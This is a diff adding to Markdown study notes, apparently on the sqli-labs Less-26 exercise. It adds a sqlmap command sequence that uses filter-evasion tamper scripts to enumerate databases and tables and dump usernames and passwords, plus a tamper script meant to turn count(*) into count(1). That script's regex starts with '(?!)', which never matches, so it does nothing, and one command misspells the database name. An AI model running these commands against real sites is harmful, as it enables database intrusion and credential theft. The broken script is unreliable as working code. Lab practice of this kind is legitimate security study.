@@ -2389,3 +2389,55 @@ def tamper(payload, **kwargs):
             retVal += payload[i]
     return retVal
 ```
+
+</details>
+
+<details>
+<summary>sqlmap</summary>
+
+```
+>>> sqlmap -u "http://IP/sqli/Less-26/id=1"
+
+//--tamper增加脚本文本， -v 3 查看输出的payload
+>>> sqlmap -u "http://IP/sql/Less-26/?id=3" --tamper "double-and-or.py,space2A0.py" -v 3
+
+//遍历数据库
+>>> sqlmap -u "http://IP/sql/Less-26/?id=3" --tamper "double-and-or.py,space2A0.py" -v 3 -dbs
+
+//数据表
+>>> sqlmap -u "http://IP/sql/Less-26/?id=3" --tamper "double-and-or.py,space2A0.py" -v 3 -D "serurity" --tables
+
+//表中的字段
+>>> sqlmap -u "http://IP/sql/Less-26/?id=3" --tamper "double-and-or.py,space2A0.py" -v 3 -D "security" -T "users" --columns
+
+//数据
+>>> sqlmap -u "http://IP/sql/Less-26/?id=3" --tamper "double-and-or.py,space2A0.py" -v 3 -D "security" -T "users" -C "username,password" --dump
+```
+
+</details>
+
+<details>
+<summary>count.py_关键词*_count(*)变成count(1)</summary>
+
+```
+#!/usr/bin/env python
+# -*- coding:UTF-8 -*-
+import re
+
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    retVal = payload
+    if payload:
+        retVal = re.sub(r"(?!)count\(\*\)", r"count(1)",payload)
+    return retVal
+```
+
+</details>
+
+
+
